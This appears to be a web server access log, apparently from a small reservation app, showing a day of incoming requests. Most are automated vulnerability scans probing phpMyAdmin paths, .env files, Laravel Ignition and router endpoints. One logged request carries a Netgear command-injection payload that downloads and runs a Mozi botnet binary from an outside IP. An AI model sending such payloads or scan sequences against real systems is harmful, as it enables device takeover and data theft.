+127.0.0.1 - - [20/Oct/2022 07:10:57] "[33mGET /phpmy/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:57] "[33mGET /phpmyadmin2/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:58] "[33mGET /db/phpmyadmin3/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:58] "[33mGET /mysql/mysqlmanager/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:58] "[33mGET /mysql-admin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:58] "[33mGET /phpmyadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:58] "[33mGET /1phpmyadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:58] "[33mGET /phpMyAdmin_/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:58] "[33mGET /db/webdb/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:58] "[33mGET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:59] "[33mGET /db/phpMyAdmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:59] "[33mGET /sql/sqladmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:59] "[33mGET /phpmyadmin1/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:59] "[33mGET /administrator/web/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:59] "[33mGET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:59] "[33mGET /db/phpmyadmin3/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:59] "[33mGET /mysql/db/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:10:59] "[33mGET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:00] "[33mGET /program/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:00] "[33mGET /db/db-admin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:00] "[33mGET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:00] "[33mGET /db/webadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:00] "[33mGET /1phpmyadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:00] "[33mGET /phpMyAdmin-4/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:00] "[33mGET /db/myadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:00] "[33mGET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:01] "[33mGET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:01] "[33mGET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:01] "[33mGET /mysql/pma/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:01] "[33mGET /phpmyadmin1/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:01] "[33mGET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:01] "[33mGET /php-myadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:01] "[33mGET /sql/websql/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:01] "[33mGET /phpmyadmin5/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:01] "[33mGET /phpmyadmin4/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:02] "[33mGET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:02] "[33mGET /mysqlmanager/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:02] "[33mGET /sqlmanager/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:02] "[33mGET /sql/sqladmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:02] "[33mGET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:02] "[33mGET /mysql-admin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:02] "[33mGET /db/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:02] "[33mGET /db/webdb/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:03] "[33mGET /sql/phpmyadmin4/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:03] "[33mGET /phpMyadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:03] "[33mGET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:03] "[33mGET /admin/pma/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:03] "[33mGET /sql/phpmyadmin4/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:03] "[33mGET /phpmyadmin2012/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:03] "[33mGET /sql/php-myadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:03] "[33mGET /pma/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:04] "[33mGET /db/phpmyadmin4/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:04] "[33mGET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:04] "[33mGET /sql/myadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:04] "[33mGET /phpmyadmin3/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:04] "[33mGET /phpmy-admin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:04] "[33mGET /phpmyadmin_/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:04] "[33mGET /phpMyAdmin-3/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:04] "[33mGET /phpmyadmin2016/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:05] "[33mGET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:05] "[33mGET /phpmyadmin2019/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:05] "[33mGET /mysql/db/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:05] "[33mGET /admin/db/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:05] "[33mGET /mysql/mysqlmanager/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:05] "[33mGET /sql/webadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:05] "[33mGET /db/phpMyAdmin3/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:05] "[33mGET /phpmy/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:05] "[33mGET /db/webdb/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:06] "[33mGET /phpmyadmin2018/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:06] "[33mGET /phpMyAdmin-4/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:06] "[33mGET /sql/websql/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:06] "[33mGET /phpmyadmin2015/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:06] "[33mGET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:06] "[33mGET /php-my-admin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:06] "[33mGET /myadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:06] "[33mGET /sql/sql/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:07] "[33mGET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:07] "[33mGET /sql/webadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:07] "[33mGET /phpMyAdmin_/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:07] "[33mGET /_phpmyadmin_/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:07] "[33mGET /db/webdb/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:07] "[33mGET /db/myadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:07] "[33mGET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:07] "[33mGET /dbadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:11:08] "[33mGET /db/phpmyadmin/index.php?lang=en HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:44:29] "[33mGET /config/getuser?index=0 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 07:48:58] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 07:52:25] "[33mGET /druid/index.html HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 08:21:21] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 08:21:22] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 09:18:21] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://119.179.211.167:40700/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 09:34:49] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 09:34:49] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 09:43:30] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 09:43:30] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 09:43:31] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 09:43:32] "[33mGET /robots.txt HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 09:45:58] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 09:45:58] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 09:57:48] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 09:57:48] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 10:17:21] "[33mGET /.git/HEAD HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 10:26:01] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 10:26:01] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 10:44:11] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 10:44:11] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 11:03:58] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 11:03:58] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 11:29:00] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 11:36:25] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 12:07:38] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 12:07:39] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:21:30] "[31m[1mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 12:25:46] "GET /send-message?msg=Día_2022-10-15,_Hora:_07:00,_Cantidad_de_personas:_1.%0A_Responde_'Rechazar_22'_para_rechazarla..%0A_Responde_'Confirmar_22'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 12:25:57] "GET /send-message?msg=Día_2022-10-15,_Hora:_07:00,_Cantidad_de_personas:_1.%0A_Responde_'Rechazar_23'_para_rechazarla..%0A_Responde_'Confirmar_23'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [20/Oct/2022 12:30:46] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:46] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:47] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:48] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:49] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:49] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:50] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:51] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:51] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:52] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:53] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:53] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:54] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:55] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:55] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:56] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:57] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 12:30:57] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 13:35:04] "[33mGET /config/getuser?index=0 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 13:45:52] "[33mGET /actuator/gateway/routes HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 14:00:15] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 14:00:15] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 14:20:19] "[33mPOST /boaform/admin/formLogin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 14:28:10] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 14:28:13] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 14:28:25] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 15:11:26] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:11:26] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 15:11:47] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 15:11:47] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:11:53] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:15:55] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 15:16:00] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 15:16:00] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:20:33] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:20:35] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:20:35] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:20:36] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:20:42] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 15:20:47] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:22:14] "[33mGET /api/restaurants HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:25:06] "[33mGET /api/restaurants HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:25:07] "[33mGET /api/restaurants HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:25:15] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 15:25:19] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:28:21] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:28:21] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:28:22] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:28:22] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:28:22] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:36:34] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 15:36:35] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:36:42] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:36:52] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:37:11] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:37:31] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 15:41:23] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:41:23] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:44:57] "[33mPOST /boaform/admin/formLogin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:45:20] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 15:45:26] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:45:34] "[33mGET /reservas HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:45:42] "[33mGET /api/restaurants HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:45:48] "[33mGET /api/reservations HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:51:01] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 15:51:05] "[33mGET /all HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:51:38] "[33mGET /all HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:51:39] "[33mGET /all HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:51:41] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 15:51:48] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 15:51:52] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:53:11] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 15:53:13] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:53:18] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:54:14] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 15:57:13] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 15:57:13] "[33mPOST /HNAP1/ HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 16:02:11] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 16:02:31] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 16:02:43] "[33mGET /api/restaurans HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 16:02:48] "[33mGET /api/restaurants HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 16:03:44] "[33mGET /api/restaurants HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 16:04:06] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 16:04:57] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 16:05:51] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 16:06:33] "[33mGET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 16:12:08] "[33mGET /api/restaurants HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 16:12:09] "[33mGET /api/restaurants HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 16:13:59] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 16:14:02] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 16:14:18] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 16:14:28] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 16:14:40] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 16:29:12] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 16:29:12] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 16:29:14] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 16:33:27] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 16:33:28] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 17:14:05] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 17:14:05] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 17:18:39] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 17:18:49] "[33mGET /admin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 17:40:05] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 17:53:20] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 17:53:22] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 18:16:56] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 18:16:56] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:19:08] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 18:41:48] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:49] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:50] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:50] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:51] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:51] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:52] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:53] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:53] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:54] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:54] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:55] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:56] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:56] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:57] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:58] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:58] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 18:41:59] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 19:22:56] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 19:22:56] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 19:23:51] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 19:43:00] "[31m[1mGET / HTTP/1.0[0m" 405 -
